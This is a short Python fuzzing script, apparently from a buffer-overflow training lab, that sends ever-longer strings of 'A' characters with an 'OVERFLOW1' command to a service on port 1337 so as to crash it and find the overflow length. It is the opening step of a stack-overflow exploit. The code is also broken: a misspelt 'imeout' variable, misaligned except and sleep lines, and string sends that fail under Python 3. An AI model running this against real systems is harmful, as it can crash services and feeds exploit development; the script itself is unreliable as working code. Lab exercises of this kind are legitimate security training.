#!/usr/bin/python3

## The fuzzer will send increasingly long strings of As, up to 3000.  
## If the fuzzer crashes the server with oneof the strings, you will get an error like: Could not connect to MACHINEIP:1337.
## Make a note of thelargest number of bytes sent

import socket, time, sys
ip = "MACHINE_IP"
port = 1337
imeout = 5
buffer = []
counter = 100
while len(buffer) < 30:
  buffer.append("A" * counter)
  counter += 100
  
for string in buffer:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((ip, port))
    s.recv(1024)
    print("Fuzzing with %s bytes" % len(string))
    s.send("OVERFLOW1 " + string + "\r\n")
    s.recv(1024)
    s.close()
   except:
    print("Could not connect to " + ip + ":" + str(port))
    sys.exit(0)
   time.sleep(1)
